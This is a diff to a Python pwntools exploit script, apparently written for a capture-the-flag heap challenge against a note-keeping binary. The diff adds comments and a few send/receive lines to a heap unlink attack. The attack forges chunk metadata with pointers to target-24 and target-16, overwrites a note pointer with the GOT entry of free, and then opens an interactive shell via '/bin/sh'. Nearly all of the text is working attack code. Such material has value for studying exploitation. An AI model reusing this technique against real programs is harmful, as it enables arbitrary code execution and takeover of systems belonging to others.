@@ -168,18 +168,17 @@ if __name__ == "__main__":
     # FD->bk == P && BK->fd == P
     # 
 
-    target = leaked_heap - 6128
+    target = leaked_heap - 6128 # target is the pointer to chunk 0
 
     log.info('target address: 0x%x' % target)
     log.info('chunk_0: 0x%x' % leaked_heap)
     log.info('chunk_1: 0x%x' % (leaked_heap+16+0x80))
 
     chunk_0 = p64(0) + p64(8) + p64(target-24) + p64(target-16) + 'A'*(0x80-32)
-    chunk_1 = p64(0x80) + p64(0x90) + 'B'*0x80 # prev_size = 0x80, PREV_INUSE = 0
-    chunk_2 = p64(0) + p64(0x91) + 'C'*0x80 # PREV_INUSE = 1
+    chunk_1 = p64(0x80) + p64(0x90) + 'B'*0x80                  # prev_size = 0x80, PREV_INUSE = 0
+    chunk_2 = p64(0) + p64(0x91) + 'C'*0x80                     # PREV_INUSE = 1
 
     payload_len = len(chunk_0 + chunk_1 + chunk_2)
-
     new_note(chunk_0 + chunk_1 + chunk_2)
 
     raw_input('after overwriting metadata...')
@@ -200,6 +199,9 @@ if __name__ == "__main__":
 
     raw_input('after deleting note_1...')
 
+    # delete_note(1) makes target points to itself (to be precise, -24 bytes)
+    #
+    # [COUNT 1] [OCCUPIED YES] [SIZE 8] [8 bytes]
     edit_note(0,payload_len, p64(1) + p64(1) + p64(8) + p64(b.got['free']) + 'x'*(payload_len-32))
 
     raw_input('after editing note_0->ptr to 0x602018...')
@@ -212,6 +214,10 @@ if __name__ == "__main__":
 
     raw_input('after new note /bin/sh...')
     
+    r.clean()
+    r.send('1\n')
+    print r.recv()
+
     delete_note(17) # need refactoring. add '/bin/sh' first. recalc offset.
 
     r.interactive()
